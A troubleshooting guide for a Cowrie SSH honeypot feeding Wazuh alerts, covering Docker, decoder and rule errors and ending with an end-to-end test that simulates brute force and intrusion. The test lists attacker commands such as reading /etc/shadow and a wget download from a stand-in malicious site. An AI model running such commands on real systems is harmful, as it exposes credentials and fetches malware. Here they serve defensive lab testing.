>  [Italiano](troubleshooting.md) |  **English**

# Troubleshooting - Hands-On Experience

## Error 1: Container in Infinite Restart Loop

**Symptom:** `docker ps` shows the status "Restarting" and `docker logs cowrie` shows:

```
twistd: Unknown command: cowrie
```

**Cause:** In the `docker-compose.yml` I had mapped the volume `./etc:/cowrie/cowrie-git/etc`, overwriting the container's internal configuration directory with an **empty** host directory. Cowrie could no longer find its configuration files and was unable to start.

**Solution:** I removed the `./etc` volume from the Docker Compose, letting the container use the default configuration built into the image. Mount only the **logs**, not the configuration, unless you have a custom config ready.

**Lesson:** Mounting an empty volume on top of a non-empty container directory makes it empty inside the container. Docker **overwrites** the container's contents with the host's, not the other way around.

## Error 2: Wazuh - "Too many fields for JSON decoder"

**Symptom:** The Wazuh dashboard was not showing any Cowrie events. The file `/var/ossec/logs/ossec.log` contained:

```
analysisd: ERROR: Too many fields for JSON decoder
```

**Cause:** Cowrie's JSON logs are very detail-rich (each event can have 20-30 fields). Wazuh's JSON decoder has a default limit on the number of fields it can parse per event.

**Solution:** I increased the decoder buffer by modifying `/var/ossec/etc/local_internal_options.conf`:

```properties
analysisd.decoder_order_size=1024
```

After the change, restart Wazuh:

```bash
sudo /var/ossec/bin/wazuh-control restart
```

## Error 3: "Connection Refused" During Testing

**Symptom:** From Kali Linux, the command `ssh -p 2222 root@127.0.0.1` returned "Connection refused."

**Cause:** `127.0.0.1` (localhost) is only reachable from the machine itself. If you are testing from a **different** computer (Kali Linux), you must use the Raspberry Pi's LAN IP.

**Solution:**

```bash
# ERRATO (da un altro PC)
ssh -p 2222 root@127.0.0.1

# CORRETTO (da un altro PC)
ssh -p 2222 root@192.168.0.102
```

## Error 4: Logs Present but Dashboard Empty

**Symptom:** Wazuh was receiving the logs (verified with `logall_json` in debug mode), but the dashboard was not showing any graphical alerts.

**Cause:** The custom XML rules were missing. Wazuh was receiving the JSON events but did not know how to classify them -- without a matching rule, the event is recorded in internal logs but does not generate a visible alert on the dashboard.

**Solution:** I created the custom rules (see [regole-wazuh.en.md](regole-wazuh.en.md)) and validated them with `wazuh-logtest` before applying them. After restarting, alerts began appearing.

---

## Final Test

To verify that the entire system works end-to-end:

### 1. Simulate a brute force attack

From another PC (e.g., Kali Linux):

```bash
ssh -p 2222 root@<IP_RASPBERRY>
```

Enter random passwords - each failed attempt generates a `cowrie.login.failed` event --> Wazuh alert rule 100011.

### 2. Simulate an intrusion

Enter a weak password such as `root`, `12345`, `password` - Cowrie deliberately accepts them. This generates a `cowrie.login.success` event --> Wazuh alert rule 100012 (level 10 = critical).

### 3. Execute post-intrusion commands

Once "inside" the honeypot:

```bash
whoami          # Genera alert rule 100013
ls              # Genera alert rule 100013
cat /etc/shadow # Genera alert rule 100013 - l'attaccante cerca credenziali
wget http://malicious-site.com/malware  # Cowrie cattura il tentativo di download
```

### 4. Verify on the Wazuh Dashboard

Go to **Threat Hunting** and filter by:

- `rule.id: 100012` - shows all successful intrusions into the honeypot
- `rule.id: 100013` - shows all commands executed by attackers
- `rule.mitre.id: T1078` - filters by MITRE ATT&CK technique
